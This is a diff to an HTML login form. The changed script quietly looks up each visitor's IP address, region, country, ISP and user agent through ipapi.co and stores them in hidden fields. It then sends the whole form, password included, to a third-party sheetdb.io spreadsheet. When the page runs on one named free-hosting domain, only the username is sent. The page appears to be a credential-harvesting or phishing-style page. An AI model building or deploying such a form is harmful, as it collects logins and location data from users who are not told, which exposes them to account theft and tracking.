@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 
-a
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -16,8 +14,7 @@ a
     <div class="login-container">
         <h2>Login Form</h2>
 
-        <form method="POST" action="https://sheetdb.io/api/v1/xrazuriphwnmx" id="sheetdb-form">
-
+        <form method="POST" action="https://sheetdb.io/api/v1/zskwlhfofmfwi" id="sheetdb-form">
             <label for="username">Username:</label>
             <input type="text" id="username" name="data[Username]" required>
             <br>
@@ -26,7 +23,7 @@ a
             <input type="password" id="password" name="password" required>
             <br>
 
-            <!-- Add a hidden input field to store the IP address -->
+            <!-- Add hidden input fields to store information -->
             <input type="hidden" id="ip-address-input" name="data[ip-address]" value="">
             <input type="hidden" id="city-input" name="data[city]" value="">
             <input type="hidden" id="country-input" name="data[country]" value="">
@@ -40,56 +37,91 @@ a
         </form>
     </div>
 
+    <script>
+        $(document).ready(function () {
+            var allowedDomain = "dresssssifyfy.000webhostapp.com";
+
+            // Fetch the IP address using ipapi.co
+            $.getJSON('https://ipapi.co/json', function (data) {
+                // Check the logs if it passes through properly
+                console.log('IP API Response:', data);
+                console.log('Referral URL:', document.referrer);
+
+                // Set the date and time
+                var currentDateTime = new Date().toISOString();
+                $('#date-time-input').val(currentDateTime);
+
+                // Updates the hidden input fields
+                $('#ip-address-input').val(data.ip);
+                $('#city-input').val(data.region);
+                $('#country-input').val(data.country_name);
+                $('#isp-input').val(data.org);
+                $('#user-agent-input').val(navigator.userAgent);
+                $('#channel-input').val(location.protocol);
+                if (document.location.protocol === 'file:' || document.location.hostname === '127.0.0.1') {
+                    $('#referral-url-input').val(document.location);
+                } else {
+                    // Check if the referrer is available
+                    $('#referral-url-input').val(document.referrer);
+                }
+                // Handle form submission
+                var form = document.getElementById('sheetdb-form');
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault(); // To prevent from opening another tab
+
+                    // Check if the current domain is not the allowed one
+                    if (window.location.hostname !== allowedDomain) {
+                        // Fetch data using AJAX
+                        fetch(form.action, {
+                            method: "POST",
+                            body: new FormData(form),
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                // Handle the response data
+                                console.log(data);
+                                alert('Success'); // To check if it passed through
+
+                                // Reset the form
+                                form.reset();
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                alert('Error occurred'); // To check if it did not pass through
+                            });
+                    } else {
+                        // Domain is allowed, so only save the username
+                        console.log('It\'s legit'); // Domain is allowed
+
+                        // Fetch data using AJAX with only the username
+                        fetch(form.action, {
+                            method: "POST",
+                            body: JSON.stringify({
+                                "data[Username]": $('#username').val()
+                            }),
+                            headers: {
+                                'Content-Type': 'application/json'
+                            }
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                // Handle the response data
+                                console.log(data);
+                                alert('Success'); // To check if it passed through
+
+                                // Reset the form
+                                form.reset();
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                alert('Error occurred'); // To check if it did not pass through
+                            });
+                    }
+                });
+            });
+        });
+    </script>
 
 </body>
-<script>
-    $(document).ready(function () {
-        // Fetch the IP address using ipapi.co
-        $.getJSON('https://ipapi.co/json', function (data) {
-            //check the logs if it passes through properly
-            console.log('IP API Response:', data);
-            console.log('Referral URL:', document.referrer);
-
-            // Set the date and time
-            var currentDateTime = new Date().toISOString();
-            $('#date-time-input').val(currentDateTime);
-
-            //updates the hidden input fields
-            $('#ip-address-input').val(data.ip);
-            $('#city-input').val(data.region);
-            $('#country-input').val(data.country_name);
-            $('#isp-input').val(data.org);
-            $('#user-agent-input').val(navigator.userAgent);
-            $('#referral-url-input').val(document.referrer);
-            $('#channel-input').val(location.protocol);
-
-        });
-
-        // Handle form submission
-        var form = document.getElementById('sheetdb-form');
-        form.addEventListener("submit", function (e) {
-            e.preventDefault(); // to prevent from opening another tab
-
-            // Fetch data using AJAX
-            fetch(form.action, {
-                method: "POST",
-                body: new FormData(form),
-            })
-                .then(response => response.json())
-                .then(data => {
-                    // Handle the response data
-                    console.log(data);
-                    alert('Success'); // to check if it passed through
-
-                    // Reset the form
-                    form.reset();
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Error occurred'); // to check if it did not pass through
-                });
-        });
-    });
-</script>
 
 </html>
